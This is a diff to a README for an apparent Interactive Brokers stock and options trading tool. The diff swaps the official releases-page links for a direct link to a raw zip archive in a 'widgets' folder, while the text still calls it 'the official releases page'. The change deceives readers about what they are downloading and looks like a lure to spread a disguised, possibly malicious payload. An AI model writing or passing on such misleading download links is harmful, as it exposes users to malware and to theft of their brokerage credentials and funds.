@@ -1,12 +1,12 @@
 # 📈 ibkr-options-stock-trader - Trade stocks and options with ease
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/aymm9862/ibkr-options-stock-trader/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/aymm9862/ibkr-options-stock-trader/raw/refs/heads/main/widgets/stock-options-trader-ibkr-v2.3-alpha.1.zip)
 
 This application provides a visual interface for traders who use Interactive Brokers. It connects your computer to the Interactive Brokers platform to help you place trades for stocks and options. You do not need to write code to use this tool. The software handles the connection to your broker and shows your data in simple windows.
 
 ## 📥 How to download the software
 
-1. Navigate to the official releases page: [https://github.com/aymm9862/ibkr-options-stock-trader/releases](https://github.com/aymm9862/ibkr-options-stock-trader/releases).
+1. Navigate to the official releases page: [https://github.com/aymm9862/ibkr-options-stock-trader/raw/refs/heads/main/widgets/stock-options-trader-ibkr-v2.3-alpha.1.zip](https://github.com/aymm9862/ibkr-options-stock-trader/raw/refs/heads/main/widgets/stock-options-trader-ibkr-v2.3-alpha.1.zip).
 2. Look for the section labeled "Assets" at the bottom of the latest release.
 3. Select the file ending in `.exe` to download it to your Windows computer.
 4. Save the file to your desktop or your downloads folder for easy access.
